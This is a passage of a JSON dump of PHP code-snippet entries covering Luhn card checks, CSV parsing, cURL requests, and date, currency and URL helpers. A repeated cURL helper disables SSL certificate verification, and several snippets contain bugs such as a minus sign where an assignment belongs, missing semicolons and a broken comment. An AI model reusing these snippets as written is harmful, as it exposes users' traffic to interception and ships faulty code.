    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3371,
    "keyword": null,
    "link": null,
    "title": " php credit card validation",
    "description": "<? /* Luhn algorithm number checker - (c) 2005-2008 shaman - www.planzero.org *  * This code has been released into the public domain, however please      *  * give credit to the original author where possible.                      */  function luhn_check($number) {    // Strip any non-digits (useful for credit card numbers with spaces and hyphens)   $number=preg_replace('/\\D/', '', $number);    // Set the string length and parity   $number_length=strlen($number);   $parity=$number_length % 2;    // Loop through each digit and do the maths   $total=0;   for ($i=0; $i<$number_length; $i++) {     $digit=$number[$i];     // Multiply alternate digits by two     if ($i % 2 == $parity) {       $digit*=2;       // If the sum is two digits, add them together (in effect)       if ($digit > 9) {         $digit-=9;       }     }     // Total up the digits     $total+=$digit;   }    // If the total mod 10 equals 0, the number is valid   return ($total % 10 == 0) ? TRUE : FALSE;  } ?> \n$expires =  date_format( \\DateTime::createFromFormat('ym', $cc_expiration),\"ym\");  $now =  date_format(new \\DateTime(),\"ym\");  if ($expires < $now) {     return 'Expired!'; }\n",
    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3372,
    "keyword": null,
    "link": null,
    "title": " php csv to array with header",
    "description": "function parse($file, $separ = ';') {     $arrays = array_map(function ($foo) use ($separ) {         return array_map(\"trim\", str_getcsv($foo, $separ));     }, file($file, FILE_SKIP_EMPTY_LINES));      $header = $arrays[0];     unset($arrays[0]);      $array_with_keys = [];     foreach ($arrays as $array) {         $_array = [];         foreach ($array as $key => $value) {             $_array[$header[$key]] = $value;         }         $array_with_keys[] = $_array;     }      return $array_with_keys; }\n$csv = array_map('str_getcsv', file('data.csv'));\nfunction parse($filecsv){   $array = $fields = array(); $i = 0;   $handle = @fopen($filecsv, \"r\");   if ($handle) {       while (($row = fgetcsv($handle, 4096)) !== false) {           if (empty($fields)) {               $fields = $row;               continue;           }           foreach ($row as $k=>$value) {               $array[$i][$fields[$k]] = $value;           }           $i++;       }       if (!feof($handle)) {           return false;       }       fclose($handle);   }   return $array; }\n",
    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3373,
    "keyword": null,
    "link": null,
    "title": " php curl",
    "description": "$ch = curl_init(); curl_setopt($ch, CURLOPT_URL,\"http://www.example.com/process.php\"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS,$vars);  //Post Fields curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  $headers = [     'X-Apple-Tz: 0',     'X-Apple-Store-Front: 143444,12',     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',     'Accept-Encoding: gzip, deflate',     'Accept-Language: en-US,en;q=0.5',     'Cache-Control: no-cache',     'Content-Type: application/x-www-form-urlencoded; charset=utf-8',     'Host: www.example.com',     'Referer: http://www.example.com/index.php', //Your referrer address     'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0',     'X-MicrosoftAjax: Delta=true' ];  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);  $server_output = curl_exec ($ch);  curl_close ($ch);  print  $server_output ;\n// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\n<?php  $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://www.domain.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); $response = curl_exec($ch); var_export($response); \nPHP cURL GET Request A GET request retrieves data from a server. This can be a website&rsquo;s HTML, an API response or other resources.  <?php  $cURLConnection = curl_init();  curl_setopt($cURLConnection, CURLOPT_URL, 'https://hostname.tld/phone-list'); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $phoneList = curl_exec($cURLConnection); curl_close($cURLConnection);  $jsonArrayResponse - json_decode($phoneList);\nfunction getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \n// The ultimate function for all php curl requests all in one function curl( $api_url,$request = 'get' , $params = array() , $mode = false , $timeout='') {     $request = strtolower($request);      $ch = curl_init($api_url);      if($request == 'post')     {         curl_setopt ($ch, CURLOPT_POST, TRUE);         curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query($params));     }          if( $timeout != ''  )     {         curl_setopt ($ch, CURLOPT_TIMEOUT, $timeout);     }      if($request == 'put')     {         curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"PUT\");         curl_setopt($ch, CURLOPT_POSTFIELDS, $params);     }        if($request == 'delete')     {       curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"DELETE\");     }      curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, false);     curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, false);     curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);      $response     = curl_exec($ch);      if($mode)         $response     = json_decode($response , $mode);     else         $response     = json_decode($response);          return $response; }\n",
    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3374,
    "keyword": null,
    "link": null,
    "title": " php curl basic auth",
    "description": "<?php ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); $host = 'http://google.com'; $message = 'Test message'; $phone = '998999999'; $username = 'username'; $password = 'password'; $post = [     \"messages\" => [         [             \"recipient\" => $phone,             \"message-id\" => \"itrust\" . strval(time()),              \"sms\" => [                 \"originator\" => \"3700\",                 \"content\" => [                     \"text\" => $message                 ]             ]         ]     ] ]; $payloadName = json_encode($post);  $ch = curl_init($host); curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json')); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_USERPWD, $username . \":\" . $password); curl_setopt($ch, CURLOPT_TIMEOUT, 30); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadName); curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); $return = curl_exec($ch); curl_close($ch);  echo '<pre>'; var_dump($return); echo '</pre>'; \n<?php  define('OAUTH_TOKEN_URL','https://api.example.com/oauth/token'); // replace with according to documentation $url ='' ; // your redirect url $client_id = ''; // your client id from api $client_secret = ''; /your client secret from api // if api require client id and client secret in paramters then below other wise $data = \"grant_type=authorization_code&code=\".$_GET['code'].\"&client_id=\".$client_id.\"&client_secret=\".$client_secret.\"&redirect_uri=\".$url;  $headers = array(         'Content-Type:application/x-www-form-urlencoded', );  // if api requires base64 and into -H header than   //$data = \"grant_type=authorization_code&code=\".$_GET['code'].\"&redirect_uri=\".$url; //$base64 = base64_encode($client_id.\":\".$client_secret);  //$headers = array(  //   'Content-Type:application/x-www-form-urlencoded',   //  'Content-Type:application/json',    // 'Authorization: Basic '. $base64 // );  $response = curlPost($data,$headers); print_r($response);  function curlPost($data,$headers){          $ch = curl_init();     curl_setopt($ch, CURLOPT_URL,OAUTH_TOKEN_URL);      curl_setopt($ch, CURLOPT_POST, 1);     curl_setopt($ch, CURLOPT_POSTFIELDS,$data);  //Post Fields     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);          $server_output = curl_exec ($ch);          return $server_output;     curl_close ($ch);      }\n",
    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3375,
    "keyword": null,
    "link": null,
    "title": " php curl delete request",
    "description": "public function curl_delete($url) {     $ch = curl_init();     curl_setopt($ch, CURLOPT_URL, $url);     curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"DELETE\");     $result = curl_exec($ch);     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);     curl_close($ch);     return $result; } \n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3376,
    "keyword": null,
    "link": null,
    "title": " php curl example",
    "description": "// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\nPHP cURL GET Request A GET request retrieves data from a server. This can be a website&rsquo;s HTML, an API response or other resources.  <?php  $cURLConnection = curl_init();  curl_setopt($cURLConnection, CURLOPT_URL, 'https://hostname.tld/phone-list'); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $phoneList = curl_exec($cURLConnection); curl_close($cURLConnection);  $jsonArrayResponse - json_decode($phoneList);\nfunction getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \n// Get cURL resource $curl = curl_init(); // Set some options - we are passing in a useragent too here curl_setopt_array($curl, [     CURLOPT_RETURNTRANSFER => 1,     CURLOPT_URL => 'http://testcURL.com',     CURLOPT_USERAGENT => 'Codular Sample cURL Request',     CURLOPT_POST => 1,     CURLOPT_POSTFIELDS => [         item1 => 'value',         item2 => 'value2'     ] ]); // Send the request & save response to $resp $resp = curl_exec($curl); // Close request to clear up some resources curl_close($curl); \n// The ultimate function for all php curl requests all in one function curl( $api_url,$request = 'get' , $params = array() , $mode = false , $timeout='') {     $request = strtolower($request);      $ch = curl_init($api_url);      if($request == 'post')     {         curl_setopt ($ch, CURLOPT_POST, TRUE);         curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query($params));     }          if( $timeout != ''  )     {         curl_setopt ($ch, CURLOPT_TIMEOUT, $timeout);     }      if($request == 'put')     {         curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"PUT\");         curl_setopt($ch, CURLOPT_POSTFIELDS, $params);     }        if($request == 'delete')     {       curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"DELETE\");     }      curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, false);     curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, false);     curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);      $response     = curl_exec($ch);      if($mode)         $response     = json_decode($response , $mode);     else         $response     = json_decode($response);          return $response; }\n$ch = curl_init(); $curlConfig = array(     CURLOPT_URL            => \"http://www.example.com/yourscript.php\",     CURLOPT_POST           => true,     CURLOPT_RETURNTRANSFER => true,     CURLOPT_POSTFIELDS     => array(         'field1' => 'some date',         'field2' => 'some other data',     ) ); curl_setopt_array($ch, $curlConfig); $result = curl_exec($ch); curl_close($ch);  // result sent by the remote server is in $result \n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3377,
    "keyword": null,
    "link": null,
    "title": " php curl example  site:www.quora.com",
    "description": "function getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3378,
    "keyword": null,
    "link": null,
    "title": " php curl get",
    "description": "// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\n<?php  $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://www.domain.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); $response = curl_exec($ch); var_export($response); \nPHP cURL GET Request A GET request retrieves data from a server. This can be a website&rsquo;s HTML, an API response or other resources.  <?php  $cURLConnection = curl_init();  curl_setopt($cURLConnection, CURLOPT_URL, 'https://hostname.tld/phone-list'); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $phoneList = curl_exec($cURLConnection); curl_close($cURLConnection);  $jsonArrayResponse - json_decode($phoneList);\nfunction getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \n// Get cURL resource $curl = curl_init(); // Set some options - we are passing in a useragent too here curl_setopt_array($curl, [     CURLOPT_RETURNTRANSFER => 1,     CURLOPT_URL => 'http://testcURL.com',     CURLOPT_USERAGENT => 'Codular Sample cURL Request',     CURLOPT_POST => 1,     CURLOPT_POSTFIELDS => [         item1 => 'value',         item2 => 'value2'     ] ]); // Send the request & save response to $resp $resp = curl_exec($curl); // Close request to clear up some resources curl_close($curl); \n// The ultimate function for all php curl requests all in one function curl( $api_url,$request = 'get' , $params = array() , $mode = false , $timeout='') {     $request = strtolower($request);      $ch = curl_init($api_url);      if($request == 'post')     {         curl_setopt ($ch, CURLOPT_POST, TRUE);         curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query($params));     }          if( $timeout != ''  )     {         curl_setopt ($ch, CURLOPT_TIMEOUT, $timeout);     }      if($request == 'put')     {         curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"PUT\");         curl_setopt($ch, CURLOPT_POSTFIELDS, $params);     }        if($request == 'delete')     {       curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"DELETE\");     }      curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, false);     curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, false);     curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);      $response     = curl_exec($ch);      if($mode)         $response     = json_decode($response , $mode);     else         $response     = json_decode($response);          return $response; }\n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3379,
    "keyword": null,
    "link": null,
    "title": " php curl post",
    "description": "$post = [    'teste' => $_POST['teste'] ]; httpPost('url.com', $post); // function function httpPost($url, $data) {    \t$curl = curl_init($url);     curl_setopt($curl, CURLOPT_POST, true);     curl_setopt($curl, CURLOPT_POSTFIELDS, $data);     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     $response = curl_exec($curl);     curl_close($curl);     return $response; }\n// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\n<?php  $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://www.domain.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); $response = curl_exec($ch); var_export($response); \n// Get cURL resource $curl = curl_init(); // Set some options - we are passing in a useragent too here curl_setopt_array($curl, [     CURLOPT_RETURNTRANSFER => 1,     CURLOPT_URL => 'http://testcURL.com',     CURLOPT_USERAGENT => 'Codular Sample cURL Request',     CURLOPT_POST => 1,     CURLOPT_POSTFIELDS => [         item1 => 'value',         item2 => 'value2'     ] ]); // Send the request & save response to $resp $resp = curl_exec($curl); // Close request to clear up some resources curl_close($curl); \n    $post_data_arr = [       'f_name' => 'First',       'l_name' => 'Last',     ];           $url = 'http://example.com';     $curl = curl_init($url);     curl_setopt($curl, CURLOPT_POST, true);     curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data_arr);     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     $response = curl_exec($curl);     curl_close($curl);     print_r($response);  \n$headers = array(             'Content-Type: application/json',             \"x-access-token: $token\"         );         $urlPost = \"/child/all\";         $url = \"ip/apiurl\"         $curl = curl_init($url);         curl_setopt($curl, CURLOPT_URL, $url);         curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);         curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);         $response = curl_exec($curl);         curl_close($curl);         $jsonObject = json_decode($response);         return $jsonObject;\n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3380,
    "keyword": null,
    "link": null,
    "title": " php curl post application/x-www-form-urlencoded",
    "description": "//this send application/x-www-form-urlencoded                                                                                                       function httpPostXform($url, $data) {                                                                      $curl = curl_init($url);                                                                                 curl_setopt($curl, CURLOPT_POST, true);                                                                  curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));                                         curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);                                                        curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));        $response = curl_exec($curl);                                                                            curl_close($curl);                                                                                       return $response;                                                                       }                                                                                                        $r = httpPostXform(\"https://www.somesite.com\",array(\"user_id\"=>10,\"sex\"=>\"male\"));\n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3381,
    "keyword": null,
    "link": null,
    "title": " php curl post json",
    "description": "$ch = curl_init( $url ); # Setup request to send json via POST. $payload = json_encode( array( \"customer\"=> $data ) ); curl_setopt( $ch, CURLOPT_POSTFIELDS, $payload ); curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json')); # Return response instead of printing. curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true ); # Send request. $result = curl_exec($ch); curl_close($ch);\n// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3382,
    "keyword": null,
    "link": null,
    "title": " php curl print status",
    "description": "$url = 'http://www.example.com'; $ch = curl_init($url); curl_setopt($ch, CURLOPT_HEADER, true);    // we want headers curl_setopt($ch, CURLOPT_NOBODY, true);    // we don't need body curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); curl_setopt($ch, CURLOPT_TIMEOUT,10); $output = curl_exec($ch); $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);  echo 'HTTP code: ' . $httpcode;\n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3383,
    "keyword": null,
    "link": null,
    "title": " php curl ssl verify",
    "description": "curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, TRUE);\n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3384,
    "keyword": null,
    "link": null,
    "title": " php curl timeout",
    "description": "curl_setopt($ch, CURLOPT_TIMEOUT, 5); //timeout in seconds #curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000); //timeout in Milliseconds\n",
    "reg_date": "2021-10-12T10:17:53.000Z"
  },
  {
    "id": 3385,
    "keyword": null,
    "link": null,
    "title": " php curl verbose",
    "description": "curl_setopt($curlhandle, CURLOPT_VERBOSE, true);\n",
    "reg_date": "2021-10-12T10:17:54.000Z"
  },
  {
    "id": 3386,
    "keyword": null,
    "link": null,
    "title": " php curl with headers",
    "description": "$ch = curl_init(); curl_setopt($ch, CURLOPT_URL,\"http://www.example.com/process.php\"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS,$vars);  //Post Fields curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  $headers = [     'X-Apple-Tz: 0',     'X-Apple-Store-Front: 143444,12',     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',     'Accept-Encoding: gzip, deflate',     'Accept-Language: en-US,en;q=0.5',     'Cache-Control: no-cache',     'Content-Type: application/x-www-form-urlencoded; charset=utf-8',     'Host: www.example.com',     'Referer: http://www.example.com/index.php', //Your referrer address     'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0',     'X-MicrosoftAjax: Delta=true' ];  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);  $server_output = curl_exec ($ch);  curl_close ($ch);  print  $server_output ;\n$ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 1); // ...  $response = curl_exec($ch);  // Then, after your curl_exec call: $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE); $header = substr($response, 0, $header_size); $body = substr($response, $header_size); \n",
    "reg_date": "2021-10-12T10:17:54.000Z"
  },
  {
    "id": 3387,
    "keyword": null,
    "link": null,
    "title": " php currency formator",
    "description": "<?php // beware: number_format also rounds  $number = 1234.56;  // english notation (default) $english_format_number = number_format($number); // 1,235  // French notation $nombre_format_francais = number_format($number, 2, ',', ' '); // 1 234,56  $number = 1234.5678;  // english notation without thousands separator $english_format_number = number_format($number, 2, '.', ''); // 1234.57 \n <?php  $number = 1234.56;  // let's print the international format for the en_US locale setlocale(LC_MONETARY, 'en_US'); echo money_format('%i', $number) . \"\\n\"; // USD 1,234.56  // Italian national format with 2 decimals` setlocale(LC_MONETARY, 'it_IT'); echo money_format('%.2n', $number) . \"\\n\"; // Eu 1.234,56  // Using a negative number $number = -1234.5672;  // US national format, using () for negative numbers // and 10 digits for left precision setlocale(LC_MONETARY, 'en_US'); echo money_format('%(#10n', $number) . \"\\n\"; // ($        1,234.57)  // Similar format as above, adding the use of 2 digits of right // precision and '*' as a fill character echo money_format('%=*(#10.2n', $number) . \"\\n\"; // ($********1,234.57)  // Let's justify to the left, with 14 positions of width, 8 digits of // left precision, 2 of right precision, without the grouping character // and using the international format for the de_DE locale. setlocale(LC_MONETARY, 'de_DE'); echo money_format('%=*^-14#8.2i', 1234.56) . \"\\n\"; // Eu 1234,56****  // Let's add some blurb before and after the conversion specification setlocale(LC_MONETARY, 'en_GB'); $fmt = 'The final value is %i (after a 10%% discount)'; echo money_format($fmt, 1234.56) . \"\\n\"; // The final value is  GBP 1,234.56 (after a 10% discount)  ?>  \n$number = 100000; echo number_format($number); // 100,000\n<html> <head> <style> \t#box \t{ \t\twidth:350px; \t\theight:270px; \t\tmargin:0px auto; \t\tborder:2px solid black; \t} \th2{ \t\ttext-align: center; \t} \ttable{ \t\tmargin:0px auto; \t} </style> </head>  <body>  <form align=\"center\" action=\"currencyconvertor.php\" method=\"post\">  <div id=\"box\"> <h2><center>Currency Converter</center></h2> <table> \t<tr> \t<td> \t\tEnter Amount:<input type=\"text\" name=\"amount\"><br> \t</td> </tr> <tr> <td> \t<br><center>From:<select name='cur1'> \t <option value=\"AUD\">Australian Dollar(AUD)</option> \t <option value=\"USD\" selected>US Dollar(USD)</option> \t </select> </td> </tr> <tr> \t<td> \t<br><center>To:<select name='cur2'> \t <option value=\"INR\" selected >Indian Rupee(INR)</option> \t <option value=\"JPY\">Japanese Yen(JPY)</option> \t <option value=\"PHP\">Philippine Peso(PHP)</option> \t \t</select> </td> </tr> <tr> <td><center><br> <input type='submit' name='submit' value=\"CovertNow\"></center> </td> </tr> </table> </form> <?php if(isset($_POST['submit'])){ \t $amount = $_POST['amount']; $cur1 = $_POST['cur1']; $cur2 = $_POST['cur2'];  if($cur1==\"AUD\" AND $cur2==\"JPY\"){ echo \"<center><b>Your Converted Amount is:</b><br></center>\"; echo \"<center>\" . $amount*82.463 . \"</center>\"; }  if($cur1==\"AUD\" AND $cur2==\"INR\"){ echo \"<center><b>Your Converted Amount is:</b><br></center>\"; echo \"<center>\" . $amount* 51.09 . \"</center>\"; }  if($cur1==\"AUD\" AND $cur2==\"PHP\"){ echo \"<center><b>Your Converted Amount is:</b><br></center>\"; echo \"<center>\" . $amount* 37.15 . \"</center>\"; }  if($cur1==\"USD\" AND $cur2==\"JPY\"){ echo \"<center><b>Your Converted Amount is:</b><br></center>\"; echo \"<center>\" . $amount* 109.49 . \"</center>\"; }  if($cur1==\"USD\" AND $cur2==\"INR\"){ echo \"<center><b>Your Converted Amount is:</b><br></center>\"; echo \"<center>\" . $amount* 67.83 . \"</center>\"; }  if($cur1==\"USD\" AND $cur2==\"PHP\"){ echo \"<center><b>Your Converted Amount is:</b><br></center>\"; echo \"<center>\" . $amount*49.32  . \"</center>\"; }   }  ?>  </body> </html>\n",
    "reg_date": "2021-10-12T10:17:54.000Z"
  },
  {
    "id": 3388,
    "keyword": null,
    "link": null,
    "title": " php current date",
    "description": "<?php echo \"Today is \" . date(\"Y/m/d\") . \"<br>\"; echo \"Today is \" . date(\"Y.m.d\") . \"<br>\"; echo \"Today is \" . date(\"Y-m-d\") . \"<br>\"; echo \"Today is \" . date(\"l\");\n$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\n$currentYear=date(\"Y\");//2019\n//Get current date time in PHP  // Simply: $date = date('Y-m-d H:i:s');  // Or: $date = date('Y/m/d H:i:s');  // This would return the date in the following formats respectively: $date = '2012-03-06 17:33:07'; // Or $date = '2012/03/06 17:33:07';  /**   * This time is based on the default server time zone.  * If you want the date in a different time zone,  * say if you come from Nairobi, Kenya like I do, you can set  * the time zone to Nairobi as shown below.  */  date_default_timezone_set('Africa/Nairobi');  // Then call the date functions $date = date('Y-m-d H:i:s'); // Or $date = date('Y/m/d H:i:s');  // date_default_timezone_set() function is however // supported by PHP version 5.1.0 or above. \n$timestamp = strtotime('2009-10-22');  $day = date('D', $timestamp); var_dump($day);\n# Current date date_default_timezone_set('Asia/Kolkata');  echo date(\"Y-m-d H:i:s\");   # Current Time date_default_timezone_set(\"America/New_York\"); echo \"The time is \" . date(\"h:i:sa\");\n",
    "reg_date": "2021-10-12T10:17:54.000Z"
  },
  {
    "id": 3389,
    "keyword": null,
    "link": null,
    "title": " php current date get",
    "description": "<?php echo \"Today is \" . date(\"Y/m/d\") . \"<br>\"; echo \"Today is \" . date(\"Y.m.d\") . \"<br>\"; echo \"Today is \" . date(\"Y-m-d\") . \"<br>\"; echo \"Today is \" . date(\"l\");\n$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\ndate_default_timezone_set('Asia/Kolkata');  echo date(\"Y-m-d H:i:s\"); // time in India\n",
    "reg_date": "2021-10-12T10:17:54.000Z"
  },
  {
    "id": 3390,
    "keyword": null,
    "link": null,
    "title": " php current datettime us time zone",
    "description": "<?php $date = new DateTime(\"now\", new DateTimeZone('America/New_York') ); echo $date->format('Y-m-d H:i:s');\n",
    "reg_date": "2021-10-12T10:17:54.000Z"
  },
  {
    "id": 3391,
    "keyword": null,
    "link": null,
    "title": " php current file name",
    "description": "basename(__FILE__, '.php'); \n",
    "reg_date": "2021-10-12T10:17:54.000Z"
  },
  {
    "id": 3392,
    "keyword": null,
    "link": null,
    "title": " php current page url",
    "description": "<?php $uri = $_SERVER['REQUEST_URI']; echo $uri; // Outputs: URI   $protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? \"https://\" : \"http://\";  $url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; echo $url; // Outputs: Full URL   $query = $_SERVER['QUERY_STRING']; echo $query; // Outputs: Query String ?>\n<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?> \n<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?>   \n$protocol = strpos(strtolower($_SERVER['SERVER_PROTOCOL']),'https') === FALSE ? 'http' : 'https'; $host     = $_SERVER['HTTP_HOST']; $script   = $_SERVER['SCRIPT_NAME']; $params   = $_SERVER['QUERY_STRING'];   $currentUrl = $protocol . '://' . $host . $script . '?' . $params;   echo $currentUrl;\n",
    "reg_date": "2021-10-12T10:17:54.000Z"
  },
  {
    "id": 3393,
    "keyword": null,
    "link": null,
    "title": " php cut off first x characters",
    "description": "$str = \"The quick brown fox jumps over the lazy dog.\" $str2 = substr($str, 4); // \"quick brown fox jumps over the lazy dog.\" \n$str = substr($str, 1);\n",
    "reg_date": "2021-10-12T10:17:54.000Z"
  },
  {
    "id": 3394,
    "keyword": null,
    "link": null,
    "title": " php déclarer une constante URL",
    "description": " <?php   define(\"CONSTANT\", \"Bonjour le monde.\");   echo CONSTANT; // affiche \"Bonjour le monde.\" ?>  \n",
    "reg_date": "2021-10-12T10:17:55.000Z"
  },
  {
    "id": 3395,
    "keyword": null,
    "link": null,
    "title": " php data types",
